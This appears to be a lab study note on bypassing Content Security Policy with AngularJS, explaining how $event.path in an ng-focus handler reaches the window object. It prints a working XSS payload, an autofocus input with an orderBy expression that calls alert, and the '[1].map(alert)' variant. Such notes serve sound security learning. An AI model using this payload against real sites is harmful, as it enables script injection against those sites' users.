# AngularJS CSP Bypass

## Overview

Content Security Policy (CSP) blocks many traditional XSS techniques.

AngularJS provides alternative execution paths that may bypass CSP.

---

# Why Normal Escapes Fail

Under CSP mode AngularJS avoids:

```javascript
Function()
```

constructor usage.

---

This breaks many traditional sandbox escapes.

---

# AngularJS Events

AngularJS provides:

```html
ng-focus
ng-click
ng-mouseover
```

events.

---

# Special Variable

Inside AngularJS events:

```javascript
$event
```

references the browser event object.

---

# Useful Property

Chrome exposes:

```javascript
$event.path
```

or

```javascript
$event.composedPath()
```

---

The final object in the path is:

```javascript
window
```

---

# Example Payload

```html
<input autofocus
ng-focus=
"$event.path|orderBy:'[].constructor.from([1],alert)'">
```

---

# Why It Works

Flow:

```text
Focus Event
        ↓
$event.path
        ↓
window Object Reached
        ↓
alert()
```

---

# Alternative Technique

```javascript
[1].map(alert)
```

---

This avoids explicitly referencing:

```javascript
window
```

which helps bypass AngularJS checks.

---

# Related Lab

- Lab25

---

# Key Takeaways

- CSP does not always stop AngularJS exploitation.
- AngularJS events create new attack surfaces.
- $event is extremely valuable for bypasses.